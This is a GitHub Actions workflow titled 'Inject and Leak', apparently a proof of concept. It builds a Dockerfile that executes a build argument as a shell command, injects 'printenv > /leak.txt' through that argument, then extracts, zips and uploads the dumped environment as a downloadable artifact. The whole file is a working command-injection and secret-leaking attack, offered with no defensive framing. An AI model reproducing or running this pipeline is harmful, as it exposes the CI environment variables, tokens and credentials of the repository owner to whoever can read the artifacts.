name: Inject and Leak

on:
  push:
    branches:
      - main

jobs:
  inject:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout
      uses: actions/checkout@v3

    - name: Create Dockerfile with Injection Logic
      run: |
        echo 'ARG PYTHON_VERSION=3.8' > Dockerfile
        echo 'FROM alpine' >> Dockerfile
        echo 'RUN /bin/sh -c "$PYTHON_VERSION"' >> Dockerfile

    - name: Build with injected command
      run: |
        docker build --build-arg PYTHON_VERSION="printenv > /leak.txt" -t injected-image .

    - name: Extract leaked file
      run: |
        id=$(docker create injected-image)
        docker cp $id:/leak.txt ./leak.txt || echo "NO leak.txt"
        docker rm $id

    - name: Zip it
      run: |
        zip leak.zip leak.txt || echo "Nothing to zip"

    - name: Upload
      uses: actions/upload-artifact@v3
      with:
        name: leak-artifact
        path: leak.zip
